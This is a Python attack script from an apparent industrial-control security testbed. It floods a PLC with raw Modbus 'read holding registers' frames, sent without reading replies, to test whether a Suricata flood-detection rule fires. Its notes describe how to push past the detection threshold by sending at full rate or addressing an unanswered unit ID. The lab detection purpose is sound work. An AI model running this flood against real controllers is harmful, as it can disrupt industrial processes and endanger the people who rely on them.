#!/usr/bin/env python3
"""
ASCEND-PG attacks/dos_attack.py

Denial-of-Service (MITRE ATT&CK for ICS: T0814) attack step.

WHY RAW TCP/MBAP INSTEAD OF PYMODBUS (supersedes the master file §7's original
"DoS = hping3 CLI" note; see the §9 Session-13 integration entry):
Suricata's `modbus.flooded` app-layer event (rule sid:9000002) only fires once
the number of *unreplied* Modbus requests exceeds a threshold (500 by default).
pymodbus's ModbusTcpClient is synchronous — it sends a request and blocks for
the reply — so a vanilla client loop keeps every request answered and the
outstanding-request count can never accumulate. hping3 floods at the packet
layer and never speaks Modbus at all, so it can't drive an *app-layer* event
either. This script therefore talks a raw TCP socket directly: it hand-builds a
minimal Modbus "read holding registers" request (MBAP header + function 0x03)
and fires it at the target, moving straight to the next request without reading
the response.

Tunable count and delay let us test under and over the 500-request threshold.
The cycle runner (scripts/run_cycle.py) drives two bursts:
    quiet (100 requests, delay 0.05)  -> under threshold, expected NOT DETECTED
    loud  (600 requests, delay 0)     -> over threshold,  expected DETECTED

EMPIRICAL CAVEAT: "unreplied" must hold on the wire Suricata sees, not just in
the attacker's socket. If the PLC answers read-holding-registers requests, those
responses travel the mirror too and Suricata pairs request->response, collapsing
the outstanding count. So against a healthy PLC the flood is driven by burst
*rate* (delay ~ 0) or by deliberately unanswered requests (--unit pointing at a
unit ID the server won't answer) — not merely by fire-and-forget. Confirm
empirically on the live testbed which actually fires modbus.flooded before
trusting a specific count.

Usage:
    # Standalone — under/over-threshold experiments:
    python3 attacks/dos_attack.py --target 10.0.0.1 --count 100 --delay 0.05  # quiet
    python3 attacks/dos_attack.py --target 10.0.0.1 --count 600 --delay 0     # loud

    # Or driven by the cycle runner (runs the full recon -> fdi -> dos cycle):
    python3 scripts/run_cycle.py

Run this ON THE ATTACKER HOST inside the Mininet topology, like recon_step.py.
"""

import argparse
import json
import socket
import struct
import time
from datetime import datetime, timezone
from pathlib import Path

MODBUS_PORT = 502

# Quiet-by-default: keeps the standalone default safe for a live demo until
# the empirical threshold test pins down loud values. See module docstring.
DEFAULT_COUNT = 300
DEFAULT_DELAY = 0.01

# Shared event log store — repo data/ dir, anchored to this file (attacks/ ->
# repo root) so a standalone run resolves the same path the cycle runner uses.
DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"


def log_event(log_path: Path, event: dict):
    """Append one event to the shared JSON log store (JSONL format)."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    log_path.parent.mkdir(parents=True, exist_ok=True)
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(json.dumps(event) + "\n")


def build_mbap_frame(tx_id: int, unit_id: int, start_addr: int = 0,
                     quantity: int = 1) -> bytes:
    """Hand-build a Modbus/TCP 'read holding registers' request (FC 0x03).

    Frame layout (Modbus/TCP, see the Modbus Messaging Implementation Guide):
        MBAP header: transaction ID (2) | protocol ID (2, always 0)
                     | length (2, = unit + PDU) | unit ID (1)
        PDU        : function code (1, 0x03) | start addr (2) | quantity (2)

    Returns the complete 12-byte wire frame. A unique transaction ID per call
    keeps each request distinct from Suricata's point of view.
    """
    pdu = struct.pack(">BHH", 0x03, start_addr, quantity)  # 5 bytes
    length = 1 + len(pdu)  # unit ID + PDU
    mbap = struct.pack(">HHHB", tx_id, 0, length, unit_id)  # 7 bytes
    return mbap + pdu


def run_attack(target_ip: str, count: int = DEFAULT_COUNT,
               delay: float = DEFAULT_DELAY, unit_id: int = 1,
               port: int = MODBUS_PORT) -> dict:
    """Fire-and-forget Modbus flood against target_ip.

    Sends `count` raw read-holding-registers requests without reading any
    response, sleeping `delay` seconds between sends (delay ~ 0 => full-rate
    burst). Connect failures raise (run_cycle logs them as step errors);
    mid-flood send failures are counted and reported, not raised.

    Returns a dict describing what was sent, for run_cycle's result log.
    """
    sent = 0
    send_errors = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.settimeout(5)
        sock.connect((target_ip, port))
        for tx_id in range(1, count + 1):
            frame = build_mbap_frame(tx_id, unit_id)
            try:
                sock.sendall(frame)
                sent += 1
            except (socket.timeout, OSError) as exc:
                send_errors += 1
                print(f"[dos] send {tx_id} failed ({exc}) — stopping flood "
                      f"with {sent} sent")
                break
            if delay > 0:
                time.sleep(delay)
    finally:
        try:
            sock.close()
        except OSError:
            pass

    return {
        "requests_sent": sent,
        "send_errors": send_errors,
        "count": count,
        "delay": delay,
        "unit_id": unit_id,
        "target": target_ip,
    }


def main():
    parser = argparse.ArgumentParser(description="ASCEND-PG DoS (T0814) flood")
    parser.add_argument("--target", required=True,
                        help="IP of the PLC to flood (the recon-identified target)")
    parser.add_argument("--count", type=int, default=DEFAULT_COUNT,
                        help=f"Number of requests to send (default: {DEFAULT_COUNT})")
    parser.add_argument("--delay", type=float, default=DEFAULT_DELAY,
                        help="Seconds between requests; 0 = full-rate burst "
                             f"(default: {DEFAULT_DELAY})")
    parser.add_argument("--unit", type=int, default=1,
                        help="Modbus unit ID to address (default: 1). A unit ID "
                             "the server won't answer is the 'deliberately "
                             "unanswered requests' lever for triggering "
                             "modbus.flooded.")
    parser.add_argument("--port", type=int, default=MODBUS_PORT)
    parser.add_argument("--log", default=str(DEFAULT_LOG),
                        help="Path to the shared event log store "
                             "(defaults to <repo>/data/log_store.json)")
    args = parser.parse_args()

    log_path = Path(args.log)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    log_event(log_path, {
        "stage": "attack", "technique": "T0814",
        "action": "dos_start", "target": args.target,
        "count": args.count, "delay": args.delay, "unit": args.unit,
    })

    try:
        result = run_attack(args.target, count=args.count, delay=args.delay,
                            unit_id=args.unit, port=args.port)
    except Exception as exc:
        log_event(log_path, {
            "stage": "attack", "technique": "T0814",
            "action": "dos_error", "target": args.target, "error": str(exc),
        })
        print(f"[dos] FAILED against {args.target}: {exc}")
        raise

    log_event(log_path, {
        "stage": "attack", "technique": "T0814",
        "action": "dos_result", "target": args.target,
        "result": result, "success": True,
    })
    print(f"[dos] {result['requests_sent']}/{result['count']} requests sent to "
          f"{args.target} (delay={args.delay}s, unit={args.unit})")


if __name__ == "__main__":
    main()
